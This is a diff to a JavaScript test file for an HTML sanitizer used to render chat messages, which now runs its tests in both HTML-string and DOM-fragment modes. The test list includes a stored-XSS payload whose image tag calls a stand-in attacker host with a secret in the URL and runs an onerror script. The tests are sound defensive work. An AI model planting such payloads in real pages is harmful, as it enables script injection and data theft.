@@ -11,7 +11,7 @@ function browser() {
   for (const name of ['purify.min.js', 'safe-html.js']) dom.window.eval(fs.readFileSync(path.join(__dirname,'../media',name),'utf8'));
   return dom;
 }
-test('stored XSS, DOM clobbering and automatic external requests are stripped', () => {
+for(const fragment of [false,true])test(`stored XSS, DOM clobbering and automatic external requests are stripped (${fragment?'DOM':'HTML'})`, () => {
   const dom=browser(), w=dom.window;
   const payloads=[
     '<img src="https://attacker.invalid/leak?secret=fixture" onerror="alert(1)">',
@@ -27,7 +27,7 @@ test('stored XSS, DOM clobbering and automatic external requests are stripped', 
   ];
   for(const payload of payloads){
     const target=w.document.getElementById('messages');
-    target.innerHTML=w.safeHtml(payload);
+    if(fragment)target.replaceChildren(w.safeHtml(payload,true));else target.innerHTML=w.safeHtml(payload);
     assert.equal(target.querySelector('script,iframe,form,input,style,base,meta,foreignObject,math'),null);
     for(const element of target.querySelectorAll('*')) {
       for(const attr of element.attributes) assert(!/^on|^(id|name|style|nonce|srcset)$/i.test(attr.name),attr.name);
@@ -37,10 +37,11 @@ test('stored XSS, DOM clobbering and automatic external requests are stripped', 
   }
   dom.window.close();
 });
-test('safe conversation formatting, attachments and diff copying survive', () => {
+for(const fragment of [false,true])test(`safe conversation formatting, attachments and diff copying survive (${fragment?'DOM':'HTML'})`, () => {
   const dom=browser(), w=dom.window;
   const html='<article class="message assistant"><details class="file-change" data-diff="+safe"><summary>Change</summary><pre><code>&lt;script&gt;literal code&lt;/script&gt;</code></pre></details><img src="data:image/png;base64,aGVsbG8="><a href="https://example.com">link</a></article>';
-  const target=w.document.getElementById('messages');target.innerHTML=w.safeHtml(html);
+  const target=w.document.getElementById('messages');
+  if(fragment)target.replaceChildren(w.safeHtml(html,true));else target.innerHTML=w.safeHtml(html);
   assert.equal(target.querySelector('code').textContent,'<script>literal code</script>');
   assert.equal(target.querySelector('details').dataset.diff,'+safe');
   assert.equal(target.querySelector('img').getAttribute('src'),'data:image/png;base64,aGVsbG8=');
